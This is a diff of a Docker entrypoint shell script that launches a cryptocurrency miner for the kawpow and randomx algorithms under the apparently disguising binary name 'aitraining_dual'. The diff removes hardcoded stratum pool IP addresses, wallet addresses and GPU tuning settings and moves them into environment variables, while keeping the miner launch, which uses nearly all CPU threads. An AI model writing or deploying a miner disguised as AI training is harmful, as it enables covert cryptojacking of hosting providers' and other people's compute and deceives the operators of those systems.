@@ -1,19 +1,16 @@
 #!/bin/sh
 
-# --- Variable Definitions ---
+# --- Dynamic CPU Thread Detection ---
 
-# Set worker name to the container's hostname
-# In Docker, $HOSTNAME is automatically set to the container ID
-WORKER="$HOSTNAME"
+# WORKER is now an ENV variable, but we'll still set it dynamically if it was not passed in
+# In Docker, $HOSTNAME is automatically set to the container ID if WORKER ENV isn't set.
+# We will use the ENV variable $WORKER if it's set, otherwise fall back to $HOSTNAME.
+if [ -z "$WORKER" ]; then
+    WORKER="$HOSTNAME"
+fi
 
 # Detect CPU threads and leave 2 free for the system
-# We prioritize /proc/cpuinfo (standard) and fallback to cgroup logic for robustness.
-CPU_THREADS_CALC=0
-
-# Use standard /proc/cpuinfo to count logical processors
 TOTAL_PROCESSORS=$(grep -c '^processor' /proc/cpuinfo)
-
-# Subtract 2 threads for the system overhead
 CPU_THREADS_CALC=$((TOTAL_PROCESSORS - 2))
 
 # Ensure at least 1 CPU thread is used
@@ -29,23 +26,12 @@ echo "WORKER Name: $WORKER"
 echo "CPU Threads Detected: $CPU_THREADS"
 echo "----------------------------"
 
-# --- GPU Environment Variables ---
-# These are crucial for OpenCL/AMD GPU performance
-export GPU_MAX_HEAP_SIZE=100
-export GPU_MAX_USE_SYNC_OBJECTS=1
-export GPU_SINGLE_ALLOC_PERCENT=100
-export GPU_MAX_ALLOC_PERCENT=100
-export GPU_MAX_SINGLE_ALLOC_PERCENT=100
-export GPU_ENABLE_LARGE_ALLOCATION=100
-export GPU_MAX_WORKGROUP_SIZE=1024
-
 # --- Execute the Binary (aitraining_dual) ---
-# We assume aitraining_dual is present in the current working directory (/opt)
-# Note: The '--password' is set to the Worker Name ($WORKER)
+# All other parameters (ALGO, POOL, WALLET, GPU settings) are read from the environment.
 exec ./aitraining_dual \
-    --algorithm "kawpow;randomx" \
-    --pool "stratum+ssl://51.89.99.172:16161;stratum+ssl://51.222.200.133:10343" \
-    --wallet "RM2ciYa3CRqyreRsf25omrB4e1S95waALr;44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd" \
+    --algorithm "$ALGO" \
+    --pool "$POOL" \
+    --wallet "$WALLET" \
     --password "$WORKER" \
     --cpu-threads "$CPU_THREADS" \
     --keepalive true \
